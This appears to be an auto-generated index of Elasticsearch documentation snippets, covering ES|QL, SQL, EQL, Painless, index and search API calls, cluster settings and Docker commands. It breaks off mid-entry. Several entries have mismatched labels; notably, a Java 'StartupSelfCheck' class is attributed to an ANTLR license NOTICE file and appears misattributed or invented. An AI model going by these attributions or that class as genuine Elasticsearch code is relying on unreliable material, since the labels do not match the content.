https://github.com/elastic/elasticsearch/blob/main/plugins/examples/painless-whitelist/src/main/resources/org/elasticsearch/example/painlesswhitelist/example_whitelist.txt#2025-04-21_snippet_2\n\nLANGUAGE: groovy\nCODE:\n```\nstatic_import {\n  int exampleAddInts(int, int) from_class org.elasticsearch.example.painlesswhitelist.ExampleStaticMethodClass\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Airport Data with Geospatial Containment in ESQL\nDESCRIPTION: This ESQL query filters airport data from the 'airport_city_boundaries' table based on whether the city boundary contains a specific polygon. It uses the ST_CONTAINS function for geospatial comparison and selects specific fields from the matching records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_contains.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_CONTAINS(city_boundary, TO_GEOSHAPE(\"POLYGON((109.35 18.3, 109.45 18.3, 109.45 18.4, 109.35 18.4, 109.35 18.3))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: ES|QL LIKE Operator Full String Match Example (Invalid)\nDESCRIPTION: This example demonstrates that the LIKE operator in ES|QL is case-sensitive and requires a full string match when used with text fields (which ES|QL treats as keyword fields). This query will not match the value \"Elasticsearch query language\" because it only checks part of the string \"Elasticsearch\". The LIKE operator tries to match the whole string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\n\n| WHERE field LIKE \"Elasticsearch\"\n\n```\n\n----------------------------------------\n\nTITLE: Implementing Annotated Highlighter in Elasticsearch\nDESCRIPTION: Example demonstrating how to use the annotated highlighter with the annotated-text plugin. The example shows indexing a document with annotations and then searching with highlighting enabled. The annotated highlighter respects original markup and uses markdown-like syntax for highlighting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-highlighter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"my_field\": \"The cat sat on the [mat](sku3578)\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"query_string\": {\n        \"query\": \"cats\"\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"my_field\": {\n        \"type\": \"annotated\", <1>\n        \"require_field_match\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This code snippet demonstrates the boilerplate notice to be used when applying the Apache License 2.0 to a work. It requires replacing the bracketed fields with the appropriate copyright year and owner information. The notice should be enclosed in the comment syntax appropriate for the file format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/opentelemetry-context-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: String Concatenation Parameters Documentation\nDESCRIPTION: Documents the parameters for a string concatenation function in ESQL. Takes two string parameters (string1 and string2) that will be concatenated together.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/concat.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nstring1\\n:   Strings to concatenate.\\n\\nstring2\\n:   Strings to concatenate.\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Multiple Grouping Elements\nDESCRIPTION: Example of grouping by multiple columns (gender and languages) and including a COUNT aggregate function, with ORDER BY for sorting the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender g, languages l, COUNT(*) c FROM \"emp\" GROUP BY g, l ORDER BY languages ASC, gender DESC;\n```\n\n----------------------------------------\n\nTITLE: Generating RSA 2048-bit Keypair Certificate with Elasticsearch Certutil\nDESCRIPTION: This snippet generates an RSA keypair certificate with a key size of 2048 bits using the elasticsearch-certutil tool. It specifies the output file path, validity period (days), key size, and distinguished name (CN, OU, DC) for the certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/keypair/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n\"elasticsearch-certutil cert --pem --out ${PWD}/keypair-rsa-2048.zip --days 54321 --keysize 2048 --name \\\"CN=test,OU=idp,DC=elasticsearch,DC=org\\\"\"\n```\n\n----------------------------------------\n\nTITLE: Defining Map Initialization Grammar in Painless\nDESCRIPTION: Specifies the grammar for the map initialization operator in Painless, used to create and initialize Map instances with key-value pairs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_11\n\nLANGUAGE: text\nCODE:\n```\nmap_initialization: '[' key_pair (',' key_pair)* ']'\n                  | '[' ':' ']';\nkey_pair: expression ':' expression\n```\n\n----------------------------------------\n\nTITLE: Wildcard Field Pattern in Query String\nDESCRIPTION: Demonstrates specifying wildcard field patterns directly in the query string rather than in the fields parameter. Note that the asterisk needs proper escaping with backslashes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\" : {\n      \"query\" : \"city.\\\\*:(this AND that OR thus)\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the Analyzer for Match Boolean Prefix Queries\nDESCRIPTION: This snippet illustrates how to specify a custom analyzer for a match_bool_prefix query. In this case, the 'keyword' analyzer is used for the 'message' field when executing the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-bool-prefix-query.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n\"GET /_search\\n{\\n  \\\"query\\\": {\\n    \\\"match_bool_prefix\\\": {\\n      \\\"message\\\": {\\n        \\\"query\\\": \\\"quick brown f\\\",\\n        \\\"analyzer\\\": \\\"keyword\\\"\\n      }\\n    }\\n  }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Deploying Elasticsearch Docker Container in Bash\nDESCRIPTION: Runs an Elasticsearch Docker container with mapped ports, volumes, and environment variables. Includes commands for both version 5 and 6.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ndocker run -d --name es \\\n-p 9200:9200 -p 9300:9300 \\\n-v ${SHARED_FOLDER}/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \\\n-v ${SHARED_FOLDER}/data:/usr/share/elasticsearch/data \\\n-v ${SHARED_FOLDER}/snapshots:/usr/share/elasticsearch/snapshots \\\n--env \"discovery.type=single-node\" \\\ndocker.elastic.co/elasticsearch/elasticsearch:5.6.16\n\n// Version 6\ndocker.elastic.co/elasticsearch/elasticsearch:6.8.23\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Notice Template\nDESCRIPTION: Sample notice text to be displayed when an interactive program starts, informing users about warranty and redistribution terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Configuring Certificate Authorities for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to specify a list of paths to PEM encoded certificate files that should be trusted for remote cluster client SSL. Cannot be used with truststore.path simultaneously.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_46\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.certificate_authorities\n```\n\n----------------------------------------\n\nTITLE: Deploying SharePoint Server Connector with Docker\nDESCRIPTION: Command to run the Docker image for the SharePoint Server connector service. This snippet demonstrates how to start the connector using the configured YAML file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Configuring EQL Circuit Breaker in Elasticsearch\nDESCRIPTION: Settings for the EQL circuit breaker, which limits memory allocation during sequence query execution. It includes options for setting the memory limit, overhead factor, and breaker type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nbreaker.eql_sequence.limit: 50%\nbreaker.eql_sequence.overhead: 1\nbreaker.eql_sequence.type: memory\n```\n\n----------------------------------------\n\nTITLE: Indexing Child Documents with Join Field in Elasticsearch\nDESCRIPTION: Example showing how to index child documents that are linked to a parent document. Child documents must specify both the relation name and the parent ID, and must be routed to the same shard as their parent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/3?routing=1&refresh <1>\n{\n  \"my_id\": \"3\",\n  \"text\": \"This is an answer\",\n  \"my_join_field\": {\n    \"name\": \"answer\", <2>\n    \"parent\": \"1\" <3>\n  }\n}\n\nPUT my-index-000001/_doc/4?routing=1&refresh\n{\n  \"my_id\": \"4\",\n  \"text\": \"This is another answer\",\n  \"my_join_field\": {\n    \"name\": \"answer\",\n    \"parent\": \"1\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting a Point in Time (PIT) in Elasticsearch\nDESCRIPTION: This example shows how to delete a Point in Time (PIT) when you're done with pagination. This is an important cleanup step to free resources in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_pit\n{\n    \"id\" : \"46ToAwMDaWR5BXV1aWQyKwZub2RlXzMAAAAAAAAAACoBYwADaWR4BXV1aWQxAgZub2RlXzEAAAAAAAAAAAEBYQADaWR5BXV1aWQyKgZub2RlXzIAAAAAAAAAAAwBYgACBXV1aWQyAAAFdXVpZDEAAQltYXRjaF9hbGw_gAAAAA==\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch Plugin from Local File System (Unix)\nDESCRIPTION: This command installs an Elasticsearch plugin from a local file system location on Unix systems.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management-custom-url.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install file:///path/to/plugin.zip\n```\n\n----------------------------------------\n\nTITLE: Fault Detection Settings in Elasticsearch\nDESCRIPTION: Configuration for fault detection mechanisms including follower and leader check intervals, timeouts and retry counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.fault_detection.follower_check.interval: 1s\ncluster.fault_detection.follower_check.timeout: 10s\ncluster.fault_detection.follower_check.retry_count: 3\ncluster.fault_detection.leader_check.interval: 1s\ncluster.fault_detection.leader_check.timeout: 10s\ncluster.fault_detection.leader_check.retry_count: 3\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Node Attributes via Command Line\nDESCRIPTION: Shows how to set custom node attributes using command line arguments when starting Elasticsearch, useful for shard allocation filtering and awareness.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\n./bin/elasticsearch -Enode.attr.rack_id=rack_one\n```\n\n----------------------------------------\n\nTITLE: Example of RANDOM Function Usage\nDESCRIPTION: Demonstrates generating a random double value with a specific seed (123), which will always produce the same result for the same seed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_24\n\nLANGUAGE: sql\nCODE:\n```\nSELECT RANDOM(123);\n\n   RANDOM(123)\n------------------\n0.7231742029971469\n```\n\n----------------------------------------\n\nTITLE: Using the Other Bucket in Elasticsearch Filters Aggregation\nDESCRIPTION: This example demonstrates using the 'other_bucket_key' parameter to create a bucket for documents that don't match any of the specified filters, with a custom name for the 'other' bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filters-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT logs/_doc/4?refresh\n{\n  \"body\": \"info: user Bob logged out\"\n}\n\nGET logs/_search\n{\n  \"size\": 0,\n  \"aggs\" : {\n    \"messages\" : {\n      \"filters\" : {\n        \"other_bucket_key\": \"other_messages\",\n        \"filters\" : {\n          \"errors\" :   { \"match\" : { \"body\" : \"error\"   }},\n          \"warnings\" : { \"match\" : { \"body\" : \"warning\" }}\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 3,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n  \"aggregations\": {\n    \"messages\": {\n      \"buckets\": {\n        \"errors\": {\n          \"doc_count\": 1\n        },\n        \"warnings\": {\n          \"doc_count\": 2\n        },\n        \"other_messages\": {\n          \"doc_count\": 1\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ResolverStyle Enum in Java\nDESCRIPTION: The ResolverStyle enum specifies different styles of resolving date-time representations. It includes LENIENT, SMART, and STRICT options, allowing developers to control how strictly input date-time values are interpreted and adjusted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.ResolverStyle {\n  ResolverStyle LENIENT\n  ResolverStyle SMART\n  ResolverStyle STRICT\n  ResolverStyle valueOf(String)\n  ResolverStyle[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Default Stemmer Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates using the analyze API with the default stemmer filter to stem the phrase 'the foxes jumping quickly' to 'the fox jump quickli'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [ \"stemmer\" ],\n  \"text\": \"the foxes jumping quickly\"\n}\n```\n\n----------------------------------------\n\nTITLE: Runtime Field Date Histogram Example\nDESCRIPTION: Example using runtime fields to adjust dates for promoted sales in date histogram aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"runtime_mappings\": {\n    \"date.promoted_is_tomorrow\": {\n      \"type\": \"date\",\n      \"script\": \"\"\"\n        long date = doc['date'].value.toInstant().toEpochMilli();\n        if (doc['promoted'].value) {\n          date += 86400;\n        }\n        emit(date);\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date.promoted_is_tomorrow\",\n        \"calendar_interval\": \"1M\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Formatting Dates with TO_CHAR in SQL\nDESCRIPTION: Returns the date/datetime/time as a string using the format specified in the second argument according to PostgreSQL template patterns. If the input is null or invalid, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_51\n\nLANGUAGE: sql\nCODE:\n```\n\"TO_CHAR(\\n    date_exp/datetime_exp/time_exp, <1>\\n    string_exp) <2>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT TO_CHAR(CAST('2020-04-05' AS DATE), 'DD/MM/YYYY') AS \\\"date\\\";\\n\\n      date\\n------------------\\n05/04/2020\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT TO_CHAR(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'DD/MM/YYYY HH24:MI:SS.FF2') AS \\\"datetime\\\";\\n\\n      datetime\\n------------------\\n05/04/2020 11:22:33.98\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT TO_CHAR(CAST('23:22:33.987' AS TIME), 'HH12 MI SS.FF1') AS \\\"time\\\";\\n\\n      time\\n------------------\\n11 22 33.9\\n\"\n```\n\n----------------------------------------\n\nTITLE: Percolating an Existing Document\nDESCRIPTION: Illustrates how to percolate an already indexed document using its '_id' and metadata. It showcases how to issue a search request to match the new document against stored queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/2\n{\n  \"message\" : \"A new bonsai tree in the office\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing StartupSelfCheck for Elasticsearch license validation in Java\nDESCRIPTION: This snippet defines the StartupSelfCheck class, which performs license-related checks during Elasticsearch startup. It verifies the license state and handles any issues encountered during the validation process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ql/licenses/antlr4-runtime-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nclass StartupSelfCheck implements Runnable {\n    private final LicenseState licenseState;\n    private final ThreadPool threadPool;\n\n    StartupSelfCheck(LicenseState licenseState, ThreadPool threadPool) {\n        this.licenseState = licenseState;\n        this.threadPool = threadPool;\n    }\n\n    @Override\n    public void run() {\n        if (licenseState.isActive() == false) {\n            threadPool.scheduleUnlessShuttingDown(TimeValue.timeValueSeconds(10L), ThreadPool.Names.GENERIC, this);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Base-10 Logarithm Using ESQL LOG10 Function\nDESCRIPTION: Demonstrates how to use the LOG10 function to calculate the base-10 logarithm of a numeric value. The function takes a numeric input and returns a double value. Returns null and warns for zero or negative inputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/log10.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 1000.0\n| EVAL s = LOG10(d)\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with Offset in Elasticsearch\nDESCRIPTION: This example shows how to use the 'offset' parameter in a date histogram aggregation to adjust the start time of each bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"date\": \"2015-10-01T05:30:00Z\"\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"date\": \"2015-10-01T06:30:00Z\"\n}\n\nGET my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"by_day\": {\n      \"date_histogram\": {\n        \"field\":     \"date\",\n        \"calendar_interval\":  \"day\",\n        \"offset\":    \"+6h\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"by_day\": {\n      \"buckets\": [\n        {\n          \"key_as_string\": \"2015-09-30T06:00:00.000Z\",\n          \"key\": 1443592800000,\n          \"doc_count\": 1\n        },\n        {\n          \"key_as_string\": \"2015-10-01T06:00:00.000Z\",\n          \"key\": 1443679200000,\n          \"doc_count\": 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Character Length Function in Markdown\nDESCRIPTION: This snippet provides documentation for an ESQL function that returns the character length of a string. It includes a note about UTF-8 encoding and how it affects character length calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the character length of a string.\n\n::::{note}\nAll strings are in UTF-8, so a single character can use multiple bytes.\n::::\n```\n\n----------------------------------------\n\nTITLE: Filtering Data Using KQL Query in ESQL\nDESCRIPTION: Demonstrates how to use the KQL function to filter data based on a Kibana Query Language expression. The example shows filtering books by author using KQL syntax within an ESQL query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE KQL(\"author: Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Adjusting Result Size in EQL Search for Elasticsearch\nDESCRIPTION: This snippet shows how to use the 'size' parameter in an EQL search to adjust the number of returned results. In this example, it's set to return 50 hits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\",\n  \"size\": 50\n}\n```\n\n----------------------------------------\n\nTITLE: Escaping Special Characters in ESQL Regular Expressions\nDESCRIPTION: This snippet demonstrates how to escape special characters like parentheses in ESQL regular expressions using backslashes. It shows that backslashes themselves need to be escaped in string literals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/detailedDescription/rlike.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"foo ( bar\"\n| WHERE message RLIKE \"foo \\\\( bar\"\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source and Stored Keyword Field\nDESCRIPTION: This snippet illustrates how to create an index with synthetic _source and a keyword field with 'store' set to true, which preserves order and duplicates in the field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"kwd\": { \"type\": \"keyword\", \"store\": true }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"kwd\": [\"foo\", \"foo\", \"bar\", \"baz\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an API Key for the Connector - Python\nDESCRIPTION: This snippet illustrates how to create an API key for the ServiceNow connector using the Elasticsearch API. It shows the necessary HTTP method and the structure of the request body to define the API key settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Number Conversion Examples in EQL\nDESCRIPTION: Examples of converting strings to numbers using the number function, including support for different bases and handling of null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_10\n\nLANGUAGE: eql\nCODE:\n```\nnumber(\"1337\")              // returns 1337\nnumber(\"42.5\")              // returns 42.5\nnumber(\"deadbeef\", 16)      // returns 3735928559\n\n// integer literals beginning with \"0x\" are auto-detected as hexadecimal\nnumber(\"0xdeadbeef\")        // returns 3735928559\nnumber(\"0xdeadbeef\", 16)    // returns 3735928559\n\n// \"+\" and \"-\" are supported\nnumber(\"+1337\")             // returns 1337\nnumber(\"-1337\")             // returns -1337\n\n// surrounding whitespace is ignored\nnumber(\"  1337  \")          // returns 1337\n\n// process.pid = \"1337\"\nnumber(process.pid)         // returns 1337\n\n// null handling\nnumber(null)                // returns null\nnumber(null, 16)            // returns null\n\n// strings beginning with \"0x\" are treated as hexadecimal (base 16),\n// even if the <base_num> is explicitly null.\nnumber(\"0xdeadbeef\", null) // returns 3735928559\n\n// otherwise, strings are treated as decimal (base 10)\n// if the <base_num> is explicitly null.\nnumber(\"1337\", null)        // returns 1337\n```\n\n----------------------------------------\n\nTITLE: Categorizing and Counting Server Log Messages with ESQL\nDESCRIPTION: This ESQL query reads data from the 'sample_data' source, categorizes messages using the CATEGORIZE function, and counts the occurrences of each category. The result is grouped by the categorized message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/categorize.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| STATS count=COUNT() BY category=CATEGORIZE(message)\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon with Hole in WKT Format\nDESCRIPTION: This example demonstrates indexing a polygon with a hole using Well-Known Text (WKT) format. The outer polygon and inner hole are specified as separate coordinate sequences within the POLYGON definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"POLYGON ((1000.0 1000.0, 1001.0 1000.0, 1001.0 1001.0, 1000.0 1001.0, 1000.0 1000.0), (1000.2 1000.2, 1000.8 1000.2, 1000.8 1000.8, 1000.2 1000.8, 1000.2 1000.2))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using CAST Function in Elasticsearch SQL\nDESCRIPTION: The CAST function converts an expression to a specified target data type. The function requires an expression to cast and a target data type. If the cast is not possible, the query will fail.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCAST(\n    expression <1>\n AS data_type) <2>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Truncate Filter in Elasticsearch\nDESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the truncate filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-truncate-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT custom_truncate_example\n{\n  \"settings\" : {\n    \"analysis\" : {\n      \"analyzer\" : {\n        \"standard_truncate\" : {\n        \"tokenizer\" : \"standard\",\n        \"filter\" : [\"truncate\"]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Linking to Elasticsearch IP Functions Documentation\nDESCRIPTION: Markdown links to the documentation for CIDR_MATCH and IP_PREFIX functions in Elasticsearch. These links point to detailed documentation on IP-related functions that can be used in Elasticsearch SQL/ESQL queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/lists/ip-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n* [`CIDR_MATCH`](../../functions-operators/ip-functions.md#esql-cidr_match)\n* [`IP_PREFIX`](../../functions-operators/ip-functions.md#esql-ip_prefix)\n```\n\n----------------------------------------\n\nTITLE: Configuring User-based Audit Event Ignore Policy in Elasticsearch YAML\nDESCRIPTION: This setting defines a list of users or wildcards for which audit events will not be printed. It is a dynamic cluster setting that can be updated without restarting the cluster.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/auding-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.audit.logfile.events.ignore_filters.<policy_name>.users\n```\n\n----------------------------------------\n\nTITLE: Enriching Data with Language Information using ESQL\nDESCRIPTION: This ESQL query creates a row with a single column 'a' and enriches it with language information using a predefined 'languages_policy'. The query adds a new column 'language_name' based on the value in column 'a'.\nSOURCE: 